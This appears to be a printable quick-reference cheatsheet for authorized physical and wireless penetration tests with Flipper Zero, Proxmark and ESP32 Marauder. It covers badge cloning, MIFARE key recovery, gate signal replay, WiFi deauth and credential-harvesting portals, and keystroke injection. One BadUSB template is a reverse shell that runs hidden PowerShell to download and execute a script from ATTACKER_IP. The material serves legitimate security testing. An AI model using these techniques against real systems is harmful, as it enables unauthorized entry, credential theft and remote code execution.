# Cheatsheet - Quick Field Reference

Print this file (2-3 A4 pages) and carry it with you during engagements.

---

## Decision Tree - Which Module to Use

```
What do you need to test?
│
├─ BADGE / ACCESS CONTROL
│   ├─ Plastic badge/keyfob → NFC/RFID Detector
│   │   ├─ LF field (125 kHz) → RFID → Read → Clone to T5577
│   │   ├─ HF field (13.56 MHz) → NFC → Read → Dict/MFKey32 → Magic Card
│   │   └─ Both → dual-tech: test both
│   └─ Metal key (contact) → iButton → Read → Clone to RW1990
│
├─ GATE / RF DOOR
│   ├─ Frequency Analyzer → find the frequency
│   ├─ Sub-GHz Read → decode protocol
│   │   ├─ Fixed code → Immediate Replay
│   │   ├─ Rolling code → Document + Rolling Flaws
│   │   └─ Cannot decode → Read RAW
│   └─ Sub-GHz Bruteforcer (only <16 bit)
│
├─ WiFi NETWORK
│   ├─ ESP32 Marauder → scanap / scansta
│   ├─ sniffpmkid → capture PMKID (offline crack)
│   ├─ deauth → force reconnection → sniffraw (handshake)
│   └─ evilportal → credential harvest
│
├─ WIRELESS KEYBOARD / MOUSE
│   ├─ NRF24 → Channel Scan → identify device
│   └─ MouseJacker → keystroke injection
│
├─ TV / AC / DISPLAY
│   ├─ IR → Universal Remote (try database)
│   ├─ IR → Learn New Remote (capture)
│   └─ IR → Scan (brute force power off)
│
├─ LAPTOP / PC (physical access)
│   ├─ BadUSB → DuckyScript payload
│   ├─ Preparation: GUI r → cmd/powershell → payload
│   └─ BLE HID (BadBT) → same but wireless (10-15m)
│
└─ IoT / EMBEDDED DEVICE
    ├─ GPIO Debug → SWD Probe (ARM) / AVR Flasher
    ├─ I2C Scanner → enumerate devices on the bus
    ├─ SPI Mem Manager → dump flash
    └─ UART → serial console
```

---

## Common Frequencies in Italy

| Frequency | What You Find | Modulation |
|-----------|--------------|------------|
| **433.92 MHz** | Gates (Nice, Came, BFT), alarm sensors, weather, TPMS | OOK/ASK |
| **433.42 MHz** | Somfy RTS shutters | OOK |
| **434.42 MHz** | EU variants | OOK |
| **868.35 MHz** | FAAC, EU home automation, professional alarms | OOK/FSK |
| **466.075 MHz** | POCSAG pagers (hospitals, fire departments) | FSK |
| **125 kHz** | Apartment building badges (EM4100), office badges (HID Prox) | ASK/FSK |
| **13.56 MHz** | Corporate badges (MIFARE), hotel cards, transit | NFC |
| **134.2 kHz** | Animal microchips (FDX-B) | ASK |
| **2.4 GHz** | WiFi, Bluetooth, wireless mouse/keyboards, Zigbee | Various |

---

## Access Control Protocols - Quick Identification

### RFID 125 kHz (LF)

| You See... | Protocol | Security | Action |
|------------|----------|----------|--------|
| Blue/black round keyfob | EM4100 | ZERO | Clone T5577 (5 sec) |
| HID card with logo | HID H10301 | ZERO | Clone T5577 + note FC:CN |
| Card without logo, PSK | Indala | ZERO | Clone T5577 |

### NFC 13.56 MHz (HF)

| SAK | Type | Security | Action |
|-----|------|----------|--------|
| 0x08 | MIFARE Classic 1K | Low (crypto1) | Dict → MFKey32 → Clone Gen4 |
| 0x18 | MIFARE Classic 4K | Low (crypto1) | Dict → MFKey32 → Clone Gen4 |
| 0x04 | MIFARE Ultralight | No crypto | Direct Read |
| 0x44 | MIFARE UL C | 3DES | Password attack |
| 0x20 | DESFire / NTAG | AES (strong) | Document as "secure" |

### iButton

| Type | How to Recognize It | Action |
|------|---------------------|--------|
| DS1990A | Metal button, Italian intercoms | Clone to RW1990 |
| Cyfral | Russian/Eastern-EU intercoms | Emulation only |
| Metakom | Russian/Eastern-EU intercoms | Emulation only |

---

## Sub-GHz - Quick Commands

| Action | Path |
|--------|------|
| Capture decoded signal | Sub-GHz → Read → (wait for TX) → Save |
| Capture raw signal | Sub-GHz → Read RAW → REC → (wait for TX) → STOP → Save |
| Replay signal | Sub-GHz → Saved → [file] → Send |
| Find frequency | Sub-GHz → Frequency Analyzer → (press TX nearby) |
| Bruteforce | Sub-GHz → Bruteforcer → [protocol] → Start |
| Rolling analysis | Sub-GHz → Rolling Flaws → [load 2+ codes] |

---

## NFC - Quick Workflow

```
1. NFC → Read → identify SAK
2. If MIFARE Classic → Dictionary Attack (automatic)
3. If keys missing → NFC → Detect Reader → present to reader x3
4. MFKey32 → recover keys
5. NFC → Read (re-read with all keys) → full dump
6. NFC → Saved → [file] → Write → place Magic Card Gen4
7. Verify: read the Magic Card and compare with original
```

---

## BadUSB - Quick Templates

### Windows - Open CMD as Admin
```
DELAY 1000
GUI r
DELAY 500
STRING powershell Start-Process cmd -Verb runAs
ENTER
DELAY 2000
ALT y
DELAY 500
```

### Windows - Reverse Shell (PowerShell)
```
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')"
ENTER
```

### macOS - Open Terminal
```
DELAY 1000
GUI SPACE
DELAY 500
STRING terminal
DELAY 500
ENTER
DELAY 1000
```

---

## WiFi Marauder - Essential Commands

| Command | Function | Notes |
|---------|----------|-------|
| `scanap` | List APs | Always the first command |
| `scansta` | List clients | After scanap |
| `select -a [N]` | Select target AP | N = number from the list |
| `sniffpmkid` | Capture PMKID | No active client needed |
| `deauth` | Deauthenticate clients | Requires selected target |
| `sniffraw` | Capture handshake | After deauth |
| `stopscan` | Stop everything | Always after operations |
| `evilportal` | Start captive portal | Requires HTML setup |

---

## Physical Kit for Engagements

### Left Pocket
- Flipper Zero (full charge)
- 5x T5577 keyfob (labeled)
- 3x Magic Card Gen4

### Right Pocket
- Smartphone (for notes and photos)
- Powerbank 5000 mAh
- USB-C cable

### Backpack
- Proxmark3 RDV4 (backup)
- ESP32 Marauder (pre-flashed)
- NRF24L01+ with antenna
- External CC1101 with SMA antenna
- Laptop with aircrack-ng / hashcat
- Authorization documentation (ALWAYS)

### Legal Documentation (ALWAYS with you)
- Copy of the pentest contract
- Authorization letter on client's letterhead
- Photo ID
- Company contact person's phone number
- Your lawyer's phone number

---

## Quick Troubleshooting

| Problem | Quick Solution |
|---------|---------------|
| Sub-GHz won't decode | Frequency Analyzer first, then AM↔FM |
| Replay doesn't work | Get closer (<5m), may be rolling code |
| NFC won't read | Badge on top (behind screen), <3cm, no metal |
| RFID won't read | Badge on bottom (below screen), rotate 90 degrees |
| RFID emulation fails | Write to T5577 instead (more reliable) |
| NFC emulation fails | Use Magic Card Gen4 |
| BadUSB wrong layout | Check target keyboard language |
| ESP32 won't connect | Verify UART wiring, reflash firmware |
| MouseJacker no signal | Bring NRF24 antenna closer, change channel |
| IR doesn't work | Point directly, <5m, no direct sunlight |
